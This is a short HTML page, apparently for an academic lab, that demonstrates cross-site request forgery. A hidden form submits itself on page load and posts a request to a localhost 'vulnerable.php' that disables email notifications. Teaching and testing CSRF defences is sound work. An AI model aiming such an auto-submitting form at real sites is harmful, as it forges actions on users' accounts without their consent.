<!DOCTYPE html>
<html>
<head>
    <title>CSRF Demonstration</title>
</head>

<body>

<h2>Academic CSRF Demonstration</h2>

<p>
This page simulates a third-party website attempting
to submit a request to the vulnerable application.
</p>

<form id="csrfForm"
      action="http://localhost/csrf-demo/vulnerable.php"
      method="POST">
    <input type="hidden"
           name="email_notifications"
          value="disabled">
</form>
<script>
    // Demonstration only:
    // Automatically submit the cross-site form.
    document.getElementById("csrfForm").submit();
</script>
</body>
</html>